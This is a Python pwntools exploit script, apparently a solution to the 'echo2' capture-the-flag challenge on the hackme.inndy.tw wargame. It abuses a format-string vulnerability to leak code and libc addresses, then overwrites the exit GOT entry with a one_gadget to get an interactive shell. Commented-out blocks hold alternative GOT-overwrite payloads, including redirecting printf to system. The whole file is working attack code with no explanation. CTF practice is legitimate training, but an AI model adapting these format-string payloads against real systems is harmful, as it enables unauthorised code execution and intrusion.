from pwn import *
local=0
if local:
    a=process("./echo2")
    #gdb.attach(a)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else :
    a=remote("hackme.inndy.tw","7712")
    libc=ELF("../libc-2.23.so.x86_64")

elf=ELF("echo2")
#bypass pie 
offset=6
payload="%41$pAAAA"
a.sendline(payload)
main_addr=eval(a.recvuntil("AAAA",drop=True))-74
success("main_address ==> 0x%x"%main_addr)
printf_got=0x201020-0x9B9+main_addr 
system_plt=0x790-0x9b9+main_addr
exit_got=0x201048-0x9b9+main_addr 
success("printf_got ==> 0x%x"%printf_got)
success("system_plt ==> 0x%x"%system_plt)

raw_input("leak libc address .....")
payload = "%43$pAAAA"+p64(printf_got)
a.sendline(payload)
libc_base=eval(a.recvuntil("AAAA",drop=True))-libc.symbols["__libc_start_main"]-240
success("libc_base ==>0x%x"%libc_base)
one_gadget=libc_base+0x45206
success("one_gadget ==> 0x%x"%one_gadget)

def getnum(target,printed):
    if target==printed:
        return 0
    elif target>printed:
        return target-printed
    else:
        return 0x10000+target-printed 

a1=one_gadget&0xffff
a2=(one_gadget>>16)&0xffff
a2=getnum(a2,a1)
a3=(one_gadget>>32)&0xffff
a3=getnum(a3,a2+a1)

pause() # fuck, to avoid two payload is linked together

payload="%"+str(a1)+"c"+"%16$hn"
payload+="%"+str(a2)+"c"+"%17$hn"
payload+="%"+str(a3)+"c"+"%18$hn"
payload+='A'*(80-len(payload))
payload+=p64(exit_got)
payload+=p64(exit_got+2)
payload+=p64(exit_got+4)
a.sendline(payload)
sleep(0.5)
a.sendline("exit")
a.interactive()
'''
#second exploit 
raw_input("modify printf_got.....")
a1=one_gadget & 0xffff
a2=(one_gadget >>16)&0xffff
a3=(one_gadget>>32)&0xffff 
payload='%'+str(a1)+'c'+"%9$hn"
payload+='A'*(24-len(payload))
payload+=p64(exit_got)
a.sendline(payload)
sleep(0.5)
payload='%'+str(a2)+'c'+"%9$hn"
payload+='A'*(24-len(payload))
payload+=p64(exit_got+2)
sleep(0.5)
a.sendline(payload)
payload='%'+str(a3)+'c'+"%9$hn"
payload+='A'*(24-len(payload))
payload+=p64(exit_got+4)
sleep(0.5)
a.sendline(payload)
pause()
a.sendline("exit")
a.interactive()
'''

'''
#third exploit
def getnum(target,printed):
    if target==printed:
        return 0
    elif target>printed:
        return target-printed
    else:
        return 0x10000+target-printed 

a1=system_plt&0xffff
a2=(system_plt>>16)&0xffff
a2=getnum(a2,a1)
a3=(system_plt>>32)&0xffff
a3=getnum(a3,a2+a1)
a4=(system_plt>>48)&0xffff
a4=getnum(a4,a3+a2+a1)

payload="%"+str(a1)+"c"+"%16$hn"
payload+="%"+str(a2)+"c"+"%17$hn"
payload+="%"+str(a3)+"c"+"%18$hn"
payload+="%"+str(a4)+"c"+"%19$hn"
payload+='A'*(80-len(payload))
payload+=p64(printf_got)
payload+=p64(printf_got+2)
payload+=p64(printf_got+4)
payload+=p64(printf_got+6)
a.sendline(payload)
pause()
a.sendline("/bin/sh\x00")
'''
#a.interactive()
